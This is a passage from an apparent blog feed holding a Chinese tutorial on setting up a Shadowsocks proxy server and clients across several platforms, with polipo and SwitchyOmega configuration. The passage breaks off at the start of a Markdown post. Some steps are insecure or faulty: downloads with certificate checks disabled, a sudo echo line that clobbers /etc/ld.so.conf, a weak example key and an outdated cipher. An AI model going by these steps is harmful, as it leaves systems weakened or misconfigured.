# systemctl status shadowsocks -l

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5bb723e&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5bb723e&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.3&lt;/span&gt; 使用 Docker 安装 Shadowsocks&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 docker
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# yum install docker
# systemctl enable docker
# systemctl start docker

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
部署 Shadowsocks
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
# docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7679133&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7679133&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 客户端&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;p&gt;
目前支持以下客户端进行连接：
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Linux&lt;/li&gt;
&lt;li&gt;Windows&lt;/li&gt;
&lt;li&gt;Mac OS X&lt;/li&gt;
&lt;li&gt;Android&lt;/li&gt;
&lt;li&gt;IOS&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2cd4d24&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2cd4d24&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; Linux&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4897bb9&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org4897bb9&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.1&lt;/span&gt; 安装、配置和使用 Linux Shadowsocks 客户端&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
Linux 系列
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
Debian/Ubuntu:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install python-pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Fedora/Centos:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo yum install python-setuptools

&lt;/pre&gt;
&lt;p&gt;
or
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo dnf install python-setuptools
$ sudo easy_install pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
OpenSUSE:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo zypper install python-pip
$ sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
Archlinux:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo pacman -S python-pip
sudo pip install shadowsocks

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
sslocal 是客户端软件，ssserver 是服务端软件，常见于 Linux 发行版，如 Ubuntu。sslocal 在 &lt;i&gt;usr/local/bin 目录下，也有其他发行版在 /usr/bin&lt;/i&gt; 目录下，可以使用 whereis 命令找到它的位置。
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ whereis sslocal

&lt;/pre&gt;
&lt;p&gt;
sslocal: /usr/local/bin/sslocal
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/shadowsocks.json
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;{
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;server&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;server-ip&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;server_port&quot;&lt;/span&gt;:8000,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;local_address&quot;&lt;/span&gt;: &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;local_port&quot;&lt;/span&gt;:1080,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;your-password&quot;&lt;/span&gt;,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;timeout&quot;&lt;/span&gt;:600,
&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;aes-256-cfb&quot;&lt;/span&gt;
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
// 启动
$ sudo sslocal -c /etc/shadowsocks.json

&lt;/pre&gt;

&lt;pre class=&quot;example&quot;&gt;
// 后台运行
$ sudo sslocal -c /etc/shadowsocks.json -d start

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
/etc/rc.local
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/rc.local

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;sudo sslocal -c /etc/shadowsocks.json -d start
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
// 检查是否正常工作
# sudo systemctl status rc-local.service

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8d0ac85&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8d0ac85&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.2&lt;/span&gt; 开启全局代理&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装及配置 polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt install polipo
$ sudo vim /etc/polipo/config

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;org4104971&quot;&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;logSyslog&lt;/span&gt; = true
&lt;span style=&quot;color: #FF8C00;&quot;&gt;logFile&lt;/span&gt; = /var/log/polipo/polipo.log
&lt;span style=&quot;color: #FF8C00;&quot;&gt;proxyAddress&lt;/span&gt; = &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;0.0.0.0&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;socksParentProxy&lt;/span&gt; = &lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;127.0.0.1:1080&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;socksProxyType&lt;/span&gt; = socks5
&lt;span style=&quot;color: #FF8C00;&quot;&gt;chunkHighMark&lt;/span&gt; = 50331648
&lt;span style=&quot;color: #FF8C00;&quot;&gt;objectHighMark&lt;/span&gt; = 16384
&lt;span style=&quot;color: #FF8C00;&quot;&gt;serverMaxSlots&lt;/span&gt; = 64
&lt;span style=&quot;color: #FF8C00;&quot;&gt;serverSlots&lt;/span&gt; = 16
&lt;span style=&quot;color: #FF8C00;&quot;&gt;serverSlots1&lt;/span&gt; = 32
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
重启 polipo
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo systemctl restart polipo

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设置全局变量 http_proxy and https_proxy
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export http_proxy=&quot;http://127.0.0.1:8123/&quot;
$ export https_proxy=&quot;https://127.0.0.1:8123/&quot;

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
测试
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ curl www.google.com

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfb11996&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgfb11996&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.1.3&lt;/span&gt; 问题解决&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-1-3&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup
[原因分析]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old.

&lt;/pre&gt;
&lt;p&gt;
[解决办法]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-python&quot; id=&quot;org8170318&quot;&gt;VIM Command&amp;#65306;
:%s/cleanup/reset/
:x
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
not support &quot;chacha20&quot;
[解决办法]
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ apt install m2crypto gcc -y
$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz
$ tar zxvf libsodium-1.0.8.tar.gz
$ cd libsodium-1.0.8
$ sudo ./configure
$ sudo make &amp;amp;&amp;amp; make install
$ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf
$ sudo ldconfig

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orga1498ee&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orga1498ee&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; Windows&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org52fcfc2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org52fcfc2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.1&lt;/span&gt; 下载&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Windows Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org4abfc24&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org4abfc24&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.2&lt;/span&gt; 配置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;解压
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111438.png&quot; alt=&quot;shadowsocks-20170123111438.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;运行
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111902.png&quot; alt=&quot;shadowsocks-20170123111902.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;配置
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123111953.png&quot; alt=&quot;shadowsocks-20170123111953.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;设置代理
&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123112126.png&quot; alt=&quot;shadowsocks-20170123112126.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgaaad34a&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgaaad34a&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; Android&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5004807&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5004807&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; 下载&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Android Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7a95870&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org7a95870&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.2&lt;/span&gt; 配置&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-2&quot;&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/shadowsocks-20170123141118.png&quot; alt=&quot;shadowsocks-20170123141118.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0c77f22&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0c77f22&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.4&lt;/span&gt; IOS&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-4&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;打开 Apple 应用市场, 搜索 &quot;shadowrocket&quot;。我记得不错的话，标价应该是：￥12&lt;/li&gt;
&lt;li&gt;配置
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-01.jpeg&quot; alt=&quot;ios-shadowrocket-01.jpeg&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/ios-shadowrocket-02.jpeg&quot; alt=&quot;ios-shadowrocket-02.jpeg&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2d93777&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2d93777&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.5&lt;/span&gt; Mac OS X&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-5&quot;&gt;
&lt;p&gt;
&lt;a href=&quot;https://github.com/shadowsocks/ShadowsocksX-NG&quot;&gt;https://github.com/shadowsocks/ShadowsocksX-NG&lt;/a&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbcd70d5&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgbcd70d5&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 浏览器插件：SwitchyOmega&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;p&gt;
该插件用于调节代理，方便快速切换代理上网模式。根据目前使用经验，Linux 必装，Windows 可选。
&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9a04e1c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9a04e1c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 下载&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-1&quot;&gt;
&lt;p&gt;
发送邮件至 zrg1390556487@gmail.com，索取 Mac OS X Shadowsocks 客户端。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org073df95&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org073df95&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; 配置&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-3-2&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;设置代理
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-01.png&quot; alt=&quot;switchyomega-01.png&quot; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设定规则
&lt;img src=&quot;http://localhost:4000/assets/images/switchyomega-02.png&quot; alt=&quot;switchyomega-02.png&quot; /&gt;
&lt;b&gt;可选规则&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt

&lt;/pre&gt;
&lt;p&gt;
or
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt

&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgdd59930&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgdd59930&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 参考资料&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/zh-hans/Shadowsocks&quot;&gt;https://zh.wikipedia.org/zh-hans/Shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shadowsocks.com&quot;&gt;https://shadowsocks.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://shadowsocks.org/&quot;&gt;http://shadowsocks.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://morning.work/page/2015-12/install-shadowsocks-on-centos-7.html&quot;&gt;在 CentOS 7 下安装配置 shadowsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.linuxbabe.com/desktop-linux/how-to-install-and-use-shadowsocks-command-line-client&quot;&gt;Install And Use Shadowsocks Command Line Client on Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc10/&quot;&gt;ShadowsocksR 客户端 小白使用教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://kionf.com/2016/12/15/errornote-ss/&quot;&gt;ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/FelisCatus/SwitchyOmega/wiki/GFWList&quot;&gt;SwitchyOmega&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://doub.io/ss-jc25/&quot;&gt;IOS系统推荐几款支持Shadowsocks的代理软件&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html&quot;&gt;各种系统下Shadowsocks客户端的安装与配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.jianshu.com/p/41378f4e14bc&quot;&gt;linux 配置shadowsocks代理全局代理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/guizaijianchic/article/details/78422811&quot;&gt;linux ubuntu下使用ss设置全局代理,命令行也走代理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Shadowsocks" /><category term="SwitchyOmega" /><summary type="html">本文内容仅作交流学习和查阅技术资料之用，请勿用于商业用途！如造成任何后果，本文作者概不负责。谢谢您的关注！ 如果您有任何问题或建议，可以发送邮件到 zrg1390556487@gmail.com 1 服务端 1.1 服务部署第一步 首先，购买一台境外云服务器 搬瓦工 DigitalOcean AWS Vultr 1.2 安装和配置 Shadowsocks 安装 pip // CentOS # yum install python-pip 或者: # curl &quot;https://bootstrap.pypa.io/get-pip.py&quot; -o &quot;get-pip.py&quot; # python get-pip.py 安装及配置 shadowsocks // 使用 pip 安装 shadowsocks # pip install shadowsocks // 也可以选择自动安装脚本 install-shadowsocks.sh // 配置 shadowsocks # vim /etc/shadowsocks.json { &quot;server&quot;: &quot;123.123.123.123&quot;, &quot;server_port&quot;: 8388, &quot;local_address&quot;:&quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;port_password&quot;:{ &quot;9001&quot;:&quot;password9001&quot;, &quot;9002&quot;:&quot;password9002&quot;, &quot;9003&quot;:&quot;password9003&quot; }, &quot;password&quot;: &quot;password&quot;, &quot;method&quot;: &quot;aes-256-cfb&quot;, &quot;timeout&quot;:600 } 解释: - &quot;server&quot;: &quot;123.123.123.123&quot; :: 服务器 IP 地址 - &quot;server_port&quot;: 8388 :: 服务器端口号 - &quot;local_address&quot;:&quot;127.0.0.1&quot; :: 本地回环地址 - &quot;local_port&quot;:1080, :: 本地端口号 - &quot;port_password&quot; :: 映射端口和密码 - &quot;password&quot;: &quot;password&quot; :: 密码 - &quot;method&quot;: &quot;aes-256-cfb&quot; :: 加密方式，详细可参考 [[http://ucdok.com/project/generate_password.html][password tool]] - &quot;timeout&quot;:600 :: 超时时间 配置自启动脚本 # vim /etc/systemd/system/shadowsocks.service [Unit] Description=Shadowsocks [Service] TimeoutStartSec=0 ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json [Install] WantedBy=multi-user.target 设置 shadowsocks 自启动 # systemctl enable shadowsocks # systemctl start shadowsocks # systemctl status shadowsocks -l 1.3 使用 Docker 安装 Shadowsocks 安装 docker # yum install docker # systemctl enable docker # systemctl start docker 部署 Shadowsocks # docker run -dt --name ss -p 6443:6443 mritd/shadowsocks -s &quot;-s 0.0.0.0 -p 6443 -m aes-256-cfb -k test123 --fast-open&quot; 2 客户端 目前支持以下客户端进行连接： Linux Windows Mac OS X Android IOS 2.1 Linux 2.1.1 安装、配置和使用 Linux Shadowsocks 客户端 Linux 系列 Debian/Ubuntu: $ sudo apt-get install python-pip $ sudo pip install shadowsocks Fedora/Centos: $ sudo yum install python-setuptools or $ sudo dnf install python-setuptools $ sudo easy_install pip $ sudo pip install shadowsocks OpenSUSE: $ sudo zypper install python-pip $ sudo pip install shadowsocks Archlinux: $ sudo pacman -S python-pip sudo pip install shadowsocks sslocal 是客户端软件，ssserver 是服务端软件，常见于 Linux 发行版，如 Ubuntu。sslocal 在 usr/local/bin 目录下，也有其他发行版在 /usr/bin 目录下，可以使用 whereis 命令找到它的位置。 $ whereis sslocal sslocal: /usr/local/bin/sslocal /etc/shadowsocks.json { &quot;server&quot;:&quot;server-ip&quot;, &quot;server_port&quot;:8000, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;your-password&quot;, &quot;timeout&quot;:600, &quot;method&quot;:&quot;aes-256-cfb&quot; } // 启动 $ sudo sslocal -c /etc/shadowsocks.json // 后台运行 $ sudo sslocal -c /etc/shadowsocks.json -d start /etc/rc.local $ sudo vim /etc/rc.local sudo sslocal -c /etc/shadowsocks.json -d start // 检查是否正常工作 # sudo systemctl status rc-local.service 2.1.2 开启全局代理 安装及配置 polipo $ sudo apt install polipo $ sudo vim /etc/polipo/config logSyslog = true logFile = /var/log/polipo/polipo.log proxyAddress = &quot;0.0.0.0&quot; socksParentProxy = &quot;127.0.0.1:1080&quot; socksProxyType = socks5 chunkHighMark = 50331648 objectHighMark = 16384 serverMaxSlots = 64 serverSlots = 16 serverSlots1 = 32 重启 polipo $ sudo systemctl restart polipo 设置全局变量 http_proxy and https_proxy $ export http_proxy=&quot;http://127.0.0.1:8123/&quot; $ export https_proxy=&quot;https://127.0.0.1:8123/&quot; 测试 $ curl www.google.com 2.1.3 问题解决 ShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup [原因分析] openssl 1.1.0 &quot;EVP_CIPHER_CTX_cleanup&quot; is old. [解决办法] $ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py VIM Command&amp;#65306; :%s/cleanup/reset/ :x not support &quot;chacha20&quot; [解决办法] $ apt install m2crypto gcc -y $ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz $ tar zxvf libsodium-1.0.8.tar.gz $ cd libsodium-1.0.8 $ sudo ./configure $ sudo make &amp;amp;&amp;amp; make install $ sudo echo &quot;include ld.so.conf.d/*.conf&quot; &amp;gt; /etc/ld.so.conf $ sudo echo &quot;/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/lib64&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo echo &quot;/usr/local/lib&quot; &amp;gt;&amp;gt; /etc/ld.so.conf $ sudo ldconfig 2.2 Windows 2.2.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Windows Shadowsocks 客户端。 2.2.2 配置 解压 运行 配置 设置代理 2.3 Android 2.3.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Android Shadowsocks 客户端。 2.3.2 配置 2.4 IOS 打开 Apple 应用市场, 搜索 &quot;shadowrocket&quot;。我记得不错的话，标价应该是：￥12 配置 2.5 Mac OS X https://github.com/shadowsocks/ShadowsocksX-NG 3 浏览器插件：SwitchyOmega 该插件用于调节代理，方便快速切换代理上网模式。根据目前使用经验，Linux 必装，Windows 可选。 3.1 下载 发送邮件至 zrg1390556487@gmail.com，索取 Mac OS X Shadowsocks 客户端。 3.2 配置 设置代理 设定规则 可选规则 rule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txt or https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt 4 参考资料 https://zh.wikipedia.org/zh-hans/Shadowsocks https://shadowsocks.com http://shadowsocks.org/ 在 CentOS 7 下安装配置 shadowsocks Install And Use Shadowsocks Command Line Client on Linux ShadowsocksR 客户端 小白使用教程 ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup SwitchyOmega IOS系统推荐几款支持Shadowsocks的代理软件 各种系统下Shadowsocks客户端的安装与配置 linux 配置shadowsocks代理全局代理 linux ubuntu下使用ss设置全局代理,命令行也走代理</summary></entry><entry><title type="html">Learning Markdown</title><link href="http://localhost:4000/software/2019/06/05/markdown/" rel="alternate" type="text/html" title="Learning Markdown" /><published>2019-06-05T00:00:00+08:00</published><updated>2019-06-05T00:00:00+08:00</updated><id>http://localhost:4000/software/2019/06/05/markdown</id><content type="html" xml:base="http://localhost:4000/software/2019/06/05/markdown/">&lt;h2 id=&quot;标题&quot;&gt;标题&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#,一级标题 
##,二级标题
###,三级标题 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;列表&quot;&gt;列表&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 有序列表 
2. 有序列表 
3. 无序列表
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;引用&quot;&gt;引用&lt;/h2&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt; 有的人活着，他已经死了；有的人死了，他还活着
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;有的人活着，他已经死了；有的人死了，他还活着&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;图片&quot;&gt;图片&lt;/h2&gt;
